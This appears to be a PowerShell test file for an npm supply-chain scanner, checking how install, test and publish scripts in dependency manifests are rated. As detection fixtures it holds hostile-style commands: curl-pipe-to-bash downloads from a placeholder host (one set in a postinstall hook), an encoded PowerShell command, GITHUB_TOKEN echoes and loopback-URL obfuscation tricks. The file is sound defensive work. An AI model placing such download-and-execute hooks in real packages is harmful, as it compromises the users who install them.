$ErrorActionPreference = 'Stop'
$ScannerTestRoot = Split-Path -Parent $PSScriptRoot
$source = [IO.File]::ReadAllText((Join-Path $ScannerTestRoot 'Start-InvisiblePayloadScanner.ps1'))
$end = $source.IndexOf('if ($SelfTest) {')
if ($end -lt 0) { throw 'Test import boundary missing.' }
. ([scriptblock]::Create($source.Substring(0, $end).Replace('$PSScriptRoot', '$ScannerTestRoot')))
$rules = Get-SupplyChainRules
$script:passed = 0
function Assert-Triage($Condition, [string]$Label) {
    if (-not $Condition) { throw ('FAILED: ' + $Label) }
    $script:passed++
}
function Find-Script([string]$Operation, [string]$Command, [string]$Relative = 'node_modules/example/package.json') {
    $manifest = [pscustomobject]@{ scripts = [pscustomobject]@{ $Operation = $Command } }
    $findings = [Collections.Generic.List[object]]::new()
    Add-InstallScriptFindings -Findings $findings -Rules $rules -Path (Join-Path $ScannerTestRoot $Relative) -Manifest $manifest
    return $findings.ToArray()
}
# Strings are inspection fixtures only; no shell, npm, package or payload is executed.
foreach ($url in @('http://127.0.0.1:8080/test/', 'http://localhost:8080/', 'https://[::1]:443/test/', 'http://LOCALHOST/', 'http://localhost/a http://127.0.0.1/b')) {
    $hit = @(Find-Script 'test:browser' ('node tests.js ' + $url))
    Assert-Triage ($hit.Count -eq 1 -and $hit[0].severity -eq 'info' -and $hit[0].signalSeverity -eq 'high' -and $hit[0].category -eq 'dependency-local-test-script') 'literal loopback test retains signal as reference'
}
foreach ($command in @(
    'node tests.js https://example.invalid/test',
    'node tests.js http://localhost/ https://example.invalid/test',
    'node tests.js http://localhost.example.invalid/test',
    'node tests.js http://127.0.0.1@example.invalid/test',
    'node tests.js http://localhost:8080@example.invalid/test',
    'node tests.js http://127.0.0.1.example.invalid/test',
    'node tests.js http://127.1/test',
    'node tests.js http://2130706433/test',
    'node tests.js http://localhost:99999/test',
    'node tests.js http://localhost:0/test',
    'node tests.js http://%6cocalhost/test',
    'node tests.js http://localhost/?next=https://example.invalid',
    'node tests.js http://localhost/ && curl https://example.invalid/x',
    'curl http://localhost/payload | bash',
    'node tests.js http://localhost/ && powershell -EncodedCommand AAAA',
    'node tests.js http://localhost/ && echo GITHUB_TOKEN',
    'node tests.js http://localhost/ && npm install example',
    'node tests.js http://localhost/ && echo pastebin.com',
    'node tests.js http://localhost/ | sh'
)) {
    $hit = @(Find-Script 'test:browser' $command)
    Assert-Triage ($hit.Count -eq 1 -and $hit[0].severity -in @('high','critical')) 'external ambiguous or stronger signal remains warning'
}
foreach ($operation in @('preinstall','install','postinstall','prepare','prepack','start','pretest')) {
    $hit = @(Find-Script $operation 'node test.js http://localhost/')
    Assert-Triage ($hit[0].severity -in @('high','critical')) 'non-test operation not downgraded by loopback'
}
foreach ($relative in @('package.json','node_modules-copy/example/package.json')) {
    $hit = @(Find-Script 'test:browser' 'node test.js http://localhost/' $relative)
    Assert-Triage ($hit[0].severity -eq 'high') 'project script and lookalike dependency path unchanged'
}
foreach ($operation in @('prepare','prepublish','prepack','postpack')) {
    $hit = @(Find-Script $operation 'npm run all:publish')
    Assert-Triage ($hit[0].severity -eq 'info' -and $hit[0].signalSeverity -eq 'medium') 'dependency development metadata reference'
    $hit = @(Find-Script $operation 'curl https://example.invalid/payload | bash')
    Assert-Triage ($hit[0].severity -eq 'critical') 'dangerous development operation still critical'
    $hit = @(Find-Script $operation 'cat payload | sh')
    Assert-Triage ($hit[0].severity -eq 'medium') 'pipe execution without a URL is not lowered'
    $hit = @(Find-Script $operation 'npm run all:publish' 'package.json')
    Assert-Triage ($hit[0].severity -eq 'medium') 'root lifecycle unchanged'
}
foreach ($operation in @('preinstall','install','postinstall')) {
    $hit = @(Find-Script $operation 'node setup.js')
    Assert-Triage ($hit[0].severity -eq 'medium') 'ordinary dependency install hook unchanged'
}
$testRoot = Join-Path $ScannerTestRoot ('_triage-check-' + [guid]::NewGuid().ToString('N'))
$manifestRoot = Join-Path $testRoot 'node_modules/example'
[void][IO.Directory]::CreateDirectory($manifestRoot)
try {
    $manifestPath = Join-Path $manifestRoot 'package.json'
    [IO.File]::WriteAllText($manifestPath, '{"scripts":{"test:browser":"npm run webpack:test:silent && node ../build/bin/runBrowserTests.js http://127.0.0.1:8080/jsonrpc/src/browser/test/","prepack":"npm run all:publish","prepare":"patch-package","prepublish":"npm install --no-save --prefix __tests__ && npm install --no-save --prefix __tests__/__fixtures__"}}')
    $options = [pscustomobject]@{rootPath=$testRoot;scanMode='supply-chain-ioc';maxFileSizeMb=1}
    $result = Invoke-Scanner -Options $options
    Assert-Triage ($result.matchCount -eq 4 -and $result.summary.info -eq 4 -and $result.summary.high -eq 0 -and $result.summary.medium -eq 0 -and $result.coverage.status -eq 'complete') 'real scanner returns four reference findings'
    Assert-Triage ($result.riskAssessment.level -eq 'review' -and $result.responseGuidance.responses.Count -eq 0) 'no stop or urgent response from reference-only findings'
    [IO.File]::WriteAllText($manifestPath, '{"name":"keyv","version":"6.0.0","scripts":{"postinstall":"curl https://example.invalid/payload | bash"}}')
    $result = Invoke-Scanner -Options $options
    Assert-Triage (@($result.results | Where-Object { $_.category -eq 'known-malicious-package-version' -and $_.severity -in @('high','critical') }).Count -gt 0) 'known affected version preserved'
    Assert-Triage (@($result.results | Where-Object { $_.category -eq 'install-script-download-exec' -and $_.severity -eq 'critical' }).Count -gt 0 -and $result.riskAssessment.level -eq 'stop') 'download execution remains stop in full scan'
    'Dependency triage checks passed: ' + $script:passed
} finally {
    $resolved = [IO.Path]::GetFullPath($testRoot)
    $boundary = [IO.Path]::GetFullPath($ScannerTestRoot).TrimEnd('\') + '\_triage-check-'
    if (-not $resolved.StartsWith($boundary, [StringComparison]::OrdinalIgnoreCase)) { throw 'Cleanup boundary mismatch.' }
    [IO.Directory]::Delete($resolved, $true)
}
